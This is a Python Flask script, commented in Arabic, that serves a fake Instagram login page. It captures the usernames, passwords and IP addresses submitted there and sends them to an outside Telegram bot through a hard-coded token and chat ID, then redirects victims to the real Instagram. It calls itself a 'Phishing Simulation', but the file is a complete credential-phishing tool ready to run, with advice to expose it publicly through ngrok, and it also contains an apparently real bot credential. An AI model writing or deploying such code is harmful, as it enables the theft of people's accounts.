from flask import Flask, request
import requests
from datetime import datetime

app = Flask(__name__)

# 🔴 ضع هنا بيانات البوت الخاص بك (لا تشاركها مع أحد)
BOT_TOKEN = "8344671912:AAEO7zwq2RdrFyEoGjLqb1LPDHL3TcPJ67w"          # مثال: 7123456789:AAFxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
CHAT_ID = "6416121941"               # مثال: 123456789 (ID الدردشة الخاصة بك)

@app.route('/')
def home():
    return open("insta.html", encoding="utf-8").read()

@app.route('/verify', methods=['POST'])
def verify():
    ip = request.remote_addr
    username = request.form.get('username', 'غير محدد')
    password = request.form.get('password', 'غير محدد')
    
    # تنسيق الرسالة بشكل واضح ومهني (للعرض في Telegram)
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    message = f"""🚨 **Phishing Simulation Data**

👤 Username: {username}
🔑 Password: {password}
🌍 IP: {ip}

⏰ Time: {timestamp}
"""
    
    # إرسال الرسالة إلى Telegram Bot API
    telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(telegram_url, json=payload, timeout=10)
        if response.status_code == 200:
            print(f"📥 Data Captured | User: {username} | IP: {ip} | Time: {timestamp}")
        else:
            print(f"❌ فشل إرسال الرسالة إلى Telegram: {response.status_code} - {response.text}")
    except Exception as e:
        print(f"❌ خطأ في الاتصال بـ Telegram: {e}")
    
    # توجيه احترافي بعد النجاح
    redirect_html = f"""
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>Instagram</title>
        <style>
            body {{
                font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
                background-color: #fafafa;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                text-align: center;
            }}
            .success {{
                color: #0095f6;
                font-size: 1.5rem;
            }}
        </style>
    </head>
    <body>

    <div>
        <p class="success">✅ تمت عملية التوثيق بنجاح!</p>
        <p>⏳ جاري تحويلك...</p>
    </div>

    <script>
    setTimeout(function() {{
        window.location.href = "https://www.instagram.com/";
    }}, 3000);
    </script>

    </body>
    </html>
    """

    return redirect_html, 200, {'Content-Type': 'text/html; charset=utf-8'}

if __name__ == '__main__':
    print("🚀 خادم Flask جاهز للعمل!")
    print("🔗 استخدم الرابط التالي في نموذج HTML:")
    print("   action=\"http://127.0.0.1:5000/verify\"")
    print("   أو استخدم ngrok لجعله متاحاً على الإنترنت.")
    import os
port = int(os.environ.get("PORT", 10000))
app.run(host='0.0.0.0', port=port)
